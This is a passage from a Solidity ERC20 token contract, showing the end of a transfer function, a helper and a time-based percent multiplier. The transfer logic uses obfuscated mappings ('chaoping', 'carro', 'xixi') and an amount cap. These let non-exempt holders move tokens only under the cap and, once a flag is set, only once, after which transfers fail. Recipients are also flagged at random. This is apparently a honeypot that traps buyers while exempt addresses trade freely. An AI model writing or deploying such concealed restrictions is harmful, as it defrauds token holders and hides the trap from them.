        chaoping[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((chaoping[sender]) && (carro[recipient] == false)) {
        chaoping[recipient] = true;
    }
    if (carro[sender] == false) {
        require(amount < berry);
        if (thisValue == true) {
            if (xixi[sender] == true) {
                require(false);
            }
            xixi[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function minZero(uint a, uint b) private pure returns(uint) {
    if (a > b) {
        return a - b;
    } else {
        return 0;
    }
}

function calculatePercentMultiplier() public view returns(uint256) {
    if (block.timestamp <= (startTime + 1 weeks)) {
        return 300;
    } else if (block.timestamp <= (startTime + 2 weeks)) {
        return 200;
    } else if (block.timestamp <= (startTime + 3 weeks)) {
        return 150;
    } else if (block.timestamp <= (startTime + 4 weeks)) {
        return 125;
    } else {
        return 100;
    }
}

